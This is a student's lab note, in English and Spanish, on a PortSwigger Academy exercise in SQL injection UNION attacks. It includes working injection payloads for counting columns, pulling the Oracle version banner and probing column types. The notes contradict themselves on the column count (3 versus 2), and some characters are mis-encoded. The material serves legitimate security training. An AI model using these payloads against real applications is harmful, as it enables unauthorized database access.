#labs #web #ejercicio

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.

To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values.

[ACCESS THE LAB](https://portswigger.net/academy/labs/launch/c0cf223d86b3189ea471d7a4dfe43987f9306dcd549be77599964da1b517b307?referrer=%2fweb-security%2fsql-injection%2funion-attacks%2flab-determine-number-of-columns)
#### Solution

>	1. Use Burp Suite to intercept and modify the request that sets the product category filter.
>	2. Modify the`category`맗arameter, giving it the value`'+UNION+SELECT+NULL--`. Observe that an error occurs.
>	3. Modify the`category`맗arameter to add an additional column containing a null value:
   > 	
  > 	 `'+UNION+SELECT+NULL,NULL--`
>	4. Continue adding null values until the error disappears and the response includes additional content containing the null values.

### Community solutions
##### Rana Khalil
https://youtu.be/umXGHbEyW5I

>**Objetivo:** enumerar owners, tablas y columnas y volcar datos sensibles en un sistema Oracle19c (19.21) comprometido mediante inyecci칩n SQL.


---
## 游닆 Notas
## N칰mero de columnas
==' ORDER BY 3-- -

>Num  Columns = 3

Se env칤a un valor m치s alto que el n칰mero real de columnas hasta que la consulta falla; as칤 descubrimos que la vista vulnerable devuelve **2 columnas** y podremos construir los `UNION SELECT` con el mismo tama침o.
## Banner completo
==' UNION SELECT banner, NULL, NULL FROM v$version-- -

## A침adir Columnas
=='Union SELECT NULL, NULL, NULL-- -

Con el comando Select a침adimos una fila extra a la tabla
## A침adir mas columnas y tipos de datos
=='UNION SELECT  'que', 'que', NULL-- -

Solo admiten valores textuales la columna del medio.
